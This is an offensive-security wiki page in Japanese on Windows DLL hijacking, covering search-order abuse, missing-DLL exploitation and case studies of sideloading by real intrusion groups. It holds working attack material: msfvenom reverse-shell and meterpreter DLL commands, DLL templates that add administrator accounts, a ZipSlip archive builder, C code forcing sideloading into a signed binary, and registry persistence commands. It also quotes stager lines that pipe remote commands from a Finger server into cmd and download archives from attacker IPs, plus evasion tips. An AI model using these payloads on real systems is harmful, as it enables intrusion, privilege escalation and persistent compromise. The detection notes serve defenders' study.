# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションに悪意ある DLL を読み込ませるよう操作する手法です。この用語は **DLL Spoofing, Injection, and Side-Loading** のような複数の戦術を包含します。主にコード実行、永続化の獲得、そして稀に特権昇格の目的で利用されます。ここでは昇格に焦点を当てますが、ハイジャックの方法自体は目的にかかわらず一貫しています。

### 一般的な手法

DLL hijacking に用いられる手法はいくつかあり、各手法の有効性はアプリケーションの DLL ロード戦略によって異なります:

1. **DLL Replacement**: 正規の DLL を悪意あるものと差し替える。元の DLL の機能を維持するために **DLL Proxying** を併用することもある。
2. **DLL Search Order Hijacking**: 悪意ある DLL を正規のものより先に検索されるパスに置き、アプリケーションの検索パターンを悪用する。
3. **Phantom DLL Hijacking**: アプリケーションが要求するが存在しない DLL を作成し、ロードさせる。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` といった検索パラメータを変更し、アプリケーションを悪意ある DLL に向ける。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意あるものと置換する手法で、DLL side-loading に関連することが多い。
6. **Relative Path DLL Hijacking**: アプリケーションをコピーしたユーザー制御下のディレクトリに悪意ある DLL を置く手法で、Binary Proxy Execution に似る。

> [!TIP]
> DLL sideloading の上に HTML staging、AES-CTR コンフィグ、および .NET インプラントを重ねたステップバイステップのチェーンは、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

システム内で欠落している Dll を見つける最も一般的な方法は、[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を sysinternals から実行し、**次の 2 つのフィルタ**を設定することです:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして、**File System Activity** のみを表示します:

![](<../../../images/image (153).png>)

一般的な **missing dlls** を探している場合は、これを数秒間そのまま動かしておきます。\
特定の実行可能ファイル内の **missing dll** を探している場合は、別のフィルタ（例えば "Process Name" "contains" `<exec name>`）を設定して実行し、イベントのキャプチャを停止してください。

## Exploiting Missing Dlls

特権プロセスが読み込もうとする DLL を書き込めることが、特権昇格の最良のチャンスです。したがって、DLL が正規 DLL より先に検索されるフォルダに DLL を書き込めるか（例: 奇妙なケース）、または正規の DLL がどのフォルダにも存在しないために DLL が検索されるフォルダに書き込めるかのいずれかが必要です。

### Dll Search Order

[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) 内に、Dll がどのようにロードされるかの詳細があります。

Windows アプリケーションは、事前定義された検索パスのセットに従って DLL を探します。悪意ある DLL をこれらのディレクトリのいずれかに戦略的に配置しておくと、正規の DLL より先に読み込まれてしまうことで DLL hijacking が発生します。これを防ぐ一つの対策は、アプリケーションが必要な DLL を参照する際に絶対パスを使用することです。

32-bit システムでの DLL 検索順序は以下の通りです:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

これは **SafeDllSearchMode** が有効な場合の既定の検索順序です。無効にすると current directory が第2位に繰り上がります。この機能を無効化するには、HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode レジストリ値を作成して 0 に設定します（既定は有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** とともに呼ばれた場合、検索は **LoadLibraryEx** がロードしようとしている実行モジュールのディレクトリから始まります。

最後に、DLL が名前だけでなく絶対パスで指定されることもあります。その場合、その DLL はそのパスだけで検索されます（もしその DLL に依存関係があれば、それらは名前だけでロードされたものとして検索されます）。

検索順序を変更するその他の方法もありますが、ここでは説明しません。

### Chaining an arbitrary file write into a missing-DLL hijack

1. ProcMon フィルタを使用して（`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`）プロセスがプローブするが見つけられない DLL 名を収集する。
2. バイナリがスケジュール/サービスで実行される場合、その名前の DLL を **application directory**（検索順序エントリ #1）に配置しておけば、次回の実行時にロードされる。ある .NET スキャナのケースでは、プロセスは `C:\samples\app\` で `hostfxr.dll` を探してから実際のコピー `C:\Program Files\dotnet\fxr\...` をロードしていた。
3. どんなエクスポートでも良いので（例: リバースシェル）ペイロード DLL をビルドする: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`
4. あなたの原始的な権限昇格が ZipSlip-style の任意書き込みであれば、エントリが抽出先ディレクトリを抜け出すように ZIP を作り、DLL がアプリケーションフォルダに配置されるようにする:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. アーカイブを監視対象の inbox/share に配置する。scheduled task がプロセスを再起動すると、そのプロセスは悪意のある DLL を読み込み、service account としてあなたのコードを実行する。

### RTL_USER_PROCESS_PARAMETERS.DllPath による sideloading の強制

新たに作成されたプロセスの DLL 検索パスに決定論的に影響を与える高度な方法は、ntdll のネイティブ API でプロセスを作成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに攻撃者が制御するディレクトリを指定することで、インポートされた DLL を名前で解決する（絶対パスではなく、安全なロードフラグを使用していない）ターゲットプロセスが、そのディレクトリから悪意のある DLL を読み込むよう強制できます。

Key idea
- RtlCreateProcessParametersEx でプロセスパラメータを構築し、あなたが制御するフォルダを指すカスタム DllPath を提供する（例: dropper/unpacker が置かれているディレクトリ）。
- RtlCreateUserProcess でプロセスを作成する。ターゲットバイナリが名前で DLL を解決すると、ローダは解決時にこの指定された DllPath を参照し、悪意のある DLL がターゲット EXE と同じ場所にない場合でも信頼できる sideloading を可能にする。

Notes/limitations
- これは作成される子プロセスに影響する。現在のプロセスにのみ影響する SetDllDirectory とは異なる。
- ターゲットは名前で DLL を import するか LoadLibrary で読み込む必要がある（絶対パスではなく、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使用していないこと）。
- KnownDLLs やハードコードされた絶対パスはハイジャックできない。Forwarded exports や SxS により優先順位が変わる可能性がある。

Minimal C example (ntdll, ワイド文字列, 簡略化したエラーハンドリング):

<details>
<summary>完全な C 例: RTL_USER_PROCESS_PARAMETERS.DllPath による DLL sideloading の強制</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

実運用例
- 悪意のある xmllite.dll（必要な関数をエクスポートするか、実本体へのプロキシとして機能するもの）を DllPath ディレクトリに配置します。
- 上記の手法を用いて xmllite.dll を名前で検索することが知られている署名済みバイナリを起動します。ローダは提供された DllPath 経由でインポートを解決し、sideloads your DLL。

この手法は実際の攻撃でマルチステージの sideloading chains を駆動するために観測されています：最初のランチャーがヘルパー DLL をドロップし、それがカスタム DllPath を持つ Microsoft-signed で hijackable なバイナリを生成して、ステージングディレクトリから攻撃者の DLL を強制的にロードさせます。


#### Windows ドキュメントにおける DLL 検索順序の例外

Windows のドキュメントには、標準的な DLL 検索順序に対するいくつかの例外が記載されています：

- **既にメモリにロードされているものと同じ名前を持つ DLL** に遭遇した場合、システムは通常の検索をバイパスします。代わりに、デフォルトで既にメモリにある DLL に戻る前に、リダイレクトとマニフェストのチェックを行います。**このシナリオでは、システムは DLL の検索を行いません**。
- DLL が現在の Windows バージョンにとって **既知の DLL** と認識される場合、システムはその known DLL のバージョンとその依存 DLL を利用し、**検索プロセスを省略します**。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** にはこれらの既知 DLL の一覧が格納されています。
- **DLL が依存関係を持つ場合**、これらの依存 DLL の検索は、最初の DLL がフルパスで特定されていたかどうかに関係なく、まるでそれらが **モジュール名のみで示されている**かのように実行されます。

### 権限昇格

**要件**:

- **different privileges**（horizontal or lateral movement）で動作している、または動作する予定のプロセスで、**DLL が存在しない**ものを特定する。
- **DLL が検索される**任意の**ディレクトリ**に対して**書き込み権限**があることを確認する。これは実行ファイルのディレクトリやシステムパス内のディレクトリである可能性があります。

確かに、要件を見つけるのは複雑です。なぜなら **デフォルトでは特権実行ファイルが DLL を欠いていることを見つけるのは奇妙** ですし、さらに **システムパスのフォルダに書き込み権限があるのはさらに奇妙**（通常は不可能）だからです。しかし、設定ミスのある環境ではこれは可能です。\
もし運良く要件を満たす環境を見つけたなら、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認してみてください。たとえプロジェクトの **main goal of the project is bypass UAC** であっても、使用可能な Windows バージョン向けの **PoC** の Dll hijaking が見つかるかもしれません（おそらく書き込み権限のあるフォルダのパスを変更するだけで済みます）。

フォルダ内の権限を確認するには、次のように実行できます：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして **PATH 内のすべてのフォルダの権限を確認してください**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
実行可能ファイルのインポートや dll のエクスポートは次のコマンドで確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
書き込み権限がある**System Path folder**で**abuse Dll Hijacking to escalate privileges**するための完全なガイドは次を確認してください：


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
この脆弱性を検出するその他の興味深い自動化ツールとしては、**PowerSploit functions**:_Find-ProcessDLLHijack_, _Find-PathDLLHijack_ および _Write-HijackDll_ があります。

### 例

もし exploitable なシナリオを見つけた場合、成功させるために最も重要な点の一つは、対象の実行ファイルがインポートするすべての関数を少なくともエクスポートする**dll を作成すること**です。なお、Dll Hijacking は [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) または [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) に利用できる点に注意してください。**You can find an example of** **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、次のセクションでは、テンプレートとして、または不要な関数をエクスポートする**dll を作成するために役立つ**いくつかの**基本的な dll コード**を見つけることができます。

## **Dll の作成とコンパイル**

### **Dll プロキシ化**

基本的に **Dll proxy** は、ロード時に**マルウェアコードを実行する**ことができる Dll であり、さらに実ライブラリへのすべての呼び出しを**中継することにより**、期待どおりに**公開**および**動作**します。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) または [**Spartacus**](https://github.com/Accenture/Spartacus) を使用すると、実行ファイルを指定してプロキシ化したいライブラリを選択し、**プロキシ化された dll を生成する**、あるいは **Dll を指定してプロキシ化された dll を生成する**ことができます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86、x64版は見当たりませんでした）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分で用意する場合

いくつかのケースでは、コンパイルしたDllは対象プロセスによって読み込まれるため、**複数の関数をエクスポートする必要があります**。これらの関数が存在しないと、**バイナリはそれらを読み込めず**、**エクスプロイトは失敗します**。

<details>
<summary>C DLL テンプレート (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を伴う C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを持つ代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は起動時に予測可能な言語別の localization DLL をプローブし、これをハイジャックすることで任意のコード実行と永続化が可能です。

主要ポイント
- プローブパス（現在のビルド）: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- 旧パス（古いビルド）: `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore パスに書き込み可能な攻撃者が制御する DLL が存在すると、それがロードされ `DllMain(DLL_PROCESS_ATTACH)` が実行されます。エクスポートは不要です。

Procmon による検出
- フィルタ: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator を起動し、上記パスのロード試行を観察します。

最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC 静音化
- 単純なハイジャックでは UI を読み上げ/ハイライトしてしまいます。静かにするには、アタッチ時に Narrator のスレッドを列挙し、メインスレッドを開いて (`OpenThread(THREAD_SUSPEND_RESUME)`) `SuspendThread` で停止し、自分のスレッドで続行します。完全なコードは PoC を参照してください。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記により、Narrator を起動すると配置した DLL がロードされます。セキュアデスクトップ（ログオン画面）では CTRL+WIN+ENTER を押すと Narrator が開始され、あなたの DLL はセキュアデスクトップ上で SYSTEM として実行されます。

RDP-triggered SYSTEM execution (lateral movement)
- 古典的な RDP セキュリティレイヤーを許可： `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、あなたの DLL はセキュアデスクトップ上で SYSTEM として実行されます。
- RDP セッションが閉じられると実行は停止するため、迅速に inject/migrate を行ってください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool (AT) のレジストリエントリ（例: CursorIndicator）をクローンし、任意のバイナリ/DLL を指すように編集してインポートし、`configuration` をその AT 名に設定できます。これにより Accessibility フレームワーク下で任意の実行をプロキシできます。

Notes
- `%windir%\System32` 以下への書き込みや HKLM 値の変更には管理者権限が必要です。
- すべてのペイロードロジックは `DLL_PROCESS_ATTACH` 内に置けます; エクスポートは不要です。

## ケーススタディ: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

このケースは Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking**（**CVE-2025-1729**）を示します。

### 脆弱性の詳細

- **Component**: `TPQMAssistant.exe` は `C:\ProgramData\Lenovo\TPQM\Assistant\` にあります。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` はログオン中のユーザーのコンテキストで毎日 9:30 に実行されます。
- **Directory Permissions**: `CREATOR OWNER` により書き込み可能で、ローカルユーザーが任意のファイルを配置できます。
- **DLL Search Behavior**: まずワーキングディレクトリから `hostfxr.dll` をロードしようとし、存在しない場合は "NAME NOT FOUND" とログに記録します。これはローカルディレクトリの検索優先を示します。

### エクスプロイトの実装

攻撃者は同じディレクトリに悪意ある `hostfxr.dll` スタブを配置することで、欠如した DLL を悪用してユーザーのコンテキストでコード実行を達成できます：
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. スケジュールされたタスクが現在のユーザーのコンテキストで午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログインしていると、悪意のある DLL は管理者のセッション内で medium integrity として実行される。
4. 標準的な UAC bypass 手法を連鎖させて medium integrity から SYSTEM 権限へ昇格する。

## ケーススタディ: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

攻撃者は、MSI ベースの droppers を DLL side-loading と組み合わせて、信頼された署名済みプロセスの下でペイロードを実行することが多い。

Chain overview
- ユーザーが MSI をダウンロードする。GUI インストール中に CustomAction が静かに実行され（例: LaunchApplication または VBScript アクション）、埋め込まれたリソースから次段階を再構築する。
- dropper は正当な署名済み EXE と悪意のある DLL を同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名された EXE が起動されると、Windows DLL search order により最初に作業ディレクトリから wsc.dll がロードされ、署名済み親プロセスの下で攻撃者コードが実行される (ATT&CK T1574.001)。

MSI analysis (what to look for)
- CustomAction table:
- 実行ファイルや VBScript を実行するエントリを探す。疑わしいパターンの例: LaunchApplication が埋め込みファイルをバックグラウンドで実行する。
- Orca (Microsoft Orca.exe) では CustomAction、InstallExecuteSequence、Binary テーブルを確認する。
- MSI CAB 内の埋め込み/分割されたペイロード:
- 管理者抽出: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使う: lessmsi x package.msi C:\out
- VBScript CustomAction によって連結および復号される複数の小さな断片を探す。一般的なフロー:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe を使った実践的な sideloading
- 同じフォルダに次の2つのファイルを置く:
- wsc_proxy.exe: 正規に署名されたホスト (Avast)。このプロセスは自身のディレクトリから名前で wsc.dll をロードしようとします。
- wsc.dll: attacker DLL。特定の exports が必要ない場合は DllMain で十分です。必要な場合は proxy DLL を作成し、DllMain で payload を実行しつつ必要な exports を正規ライブラリへフォワードしてください。
- 最小限の DLL payload をビルド:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- エクスポート要件については、プロキシングフレームワーク（例: DLLirant/Spartacus）を使用して、payloadも実行する転送DLLを生成してください。

- この技術はホストバイナリによるDLL名解決に依存します。ホストが絶対パスや安全な読み込みフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、ハイジャックが失敗する可能性があります。
- KnownDLLs、SxS、およびforwarded exportsは優先順位に影響を与える可能性があり、ホストバイナリとエクスポートセットの選定時に考慮する必要があります。

## 署名済みトライアド + 暗号化されたpayload (ShadowPad case study)

Check Pointは、Ink DragonがShadowPadを、コアのpayloadをディスク上で暗号化したまま正規ソフトウェアに紛れ込ませるために、**three-file triad**を使用して展開する方法を説明しました:

1. **Signed host EXE** – AMD、Realtek、NVIDIAなどのベンダーが悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は実行ファイルの名前をWindowsのバイナリに見えるように変更します（例：`conhost.exe`）が、Authenticode署名は有効なままです。
2. **Malicious loader DLL** – EXEの隣に期待される名前で配置されます（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。このDLLは通常MFCバイナリでScatterBrainフレームワークで難読化されており、役割は暗号化されたblobを見つけて復号し、ShadowPadをreflectively mapすることだけです。
3. **Encrypted payload blob** – 同じディレクトリに`<name>.tmp`として保存されることが多いです。復号したpayloadをメモリマップした後、ローダはTMPファイルを削除してフォレンジック証拠を破壊します。

Tradecraftメモ:

* 署名済みEXEの名前を変更しても（PEヘッダ内の元の`OriginalFileName`を保持したまま）ベンダー署名を維持できるため、Ink Dragonが実際にはAMD/NVIDIAユーティリティである`conhost.exe`風のバイナリを配置する習慣を模倣してください。
* 実行ファイルが信頼されたままであるため、ほとんどのallowlisting制御は悪意のあるDLLが隣に置かれているだけで済みます。loader DLLのカスタマイズに注力してください。signed parentは通常そのまま実行できます。
* ShadowPadの復号器はTMP blobがloaderの隣にあり書き込み可能であることを期待しており、マッピング後にファイルをゼロ化します。payloadがロードされるまでディレクトリを可書きのままにしておいてください。メモリ内に入ったらTMPファイルはOPSEC上安全に削除可能です。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

攻撃者はDLL sideloadingをLOLBASと組み合わせ、ディスク上で唯一のカスタムアーティファクトが信頼されたEXEの隣にある悪意のあるDLLになるようにします:

- **Remote command loader (Finger):** Hidden PowerShellが`cmd.exe /c`を生成し、Fingerサーバからコマンドを引き出して`cmd`にパイプします:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`はTCP/79のテキストを取得し、`| cmd`はサーバ応答を実行し、攻撃者はセカンドステージをサーバ側でローテートできます。

- **Built-in download/extract:** 無害な拡張子のアーカイブをダウンロードして展開し、sideloadターゲットとDLLをランダムな`%LocalAppData%`フォルダに配置します:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`は進捗を隠しリダイレクトを追従します; `tar -xf`はWindows組み込みのtarを使用します。

- **WMI/CIM launch:** WMI経由でEXEを起動すると、telemetryにはCIMで作成されたプロセスとして表示され、その間に同じ場所のDLLが読み込まれます:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- ローカルDLLを優先するバイナリ（例: `intelbq.exe`、`nearby_share.exe`）で動作します; payload（例: Remcos）は信頼された名前の下で実行されます。

- **Hunting:** `/p`、`/m`、`/c`が同時に現れる`forfiles`を検知するアラートを出してください; 管理者スクリプト以外ではまれです。


## ケーススタディ: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近のLotus Blossomの侵入では、信頼されたアップデートチェーンが悪用され、NSISでパックされたdropperが配信され、DLL sideloadと完全にメモリ上で動作するpayloadをステージしました。

Tradecraftフロー
- `update.exe` (NSIS) は `%AppData%\Bluetooth` を作成し、**HIDDEN** に設定し、名前を変更したBitdefender Submission Wizard `BluetoothService.exe`、悪意のある `log.dll`、および暗号化されたblob `BluetoothService` を配置してからEXEを起動します。
- ホストEXEは `log.dll` をimportし、`LogInit`/`LogWrite` を呼び出します。`LogInit`はblobをmmapでロードし、`LogWrite`はカスタムのLCGベースのストリームで復号します（定数 **0x19660D** / **0x3C6EF35F**、鍵材料は事前のハッシュから導出）、バッファをプレーンテキストのshellcodeで上書きし、テンポラリを解放してそこへジャンプします。
- IATを避けるために、ローダはエクスポート名をハッシュしてAPIを解決します：**FNV-1a basis 0x811C9DC5 + prime 0x1000193**を使用し、続いてMurmur-styleのavalanche（**0x85EBCA6B**）を適用し、ソルト付きターゲットハッシュと比較します。

Main shellcode (Chrysalis)
- キー `gQ2JR&9;` を使って5パスのadd/XOR/subを繰り返すことでPE風のメインモジュールを復号し、その後動的に `Kernel32.dll` → `GetProcAddress` をロードしてインポート解決を完了します。
- 実行時に各文字ごとのbit-rotate/XOR変換でDLL名文字列を再構築し、その後 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` をロードします。
- 二つ目のリゾルバを使用し、**PEB → InMemoryOrderModuleList** を辿り、各エクスポートテーブルを4バイトブロックでMurmur-styleのミキシングで解析し、ハッシュが見つからない場合のみ `GetProcAddress` にフォールバックします。

Embedded configuration & C2
- 設定はドロップされた `BluetoothService` ファイルの **offset 0x30808**（サイズ **0x980**）にあり、キー `qwhvb^435h&*7` でRC4復号され、C2のURLとUser-Agentが明らかになります。
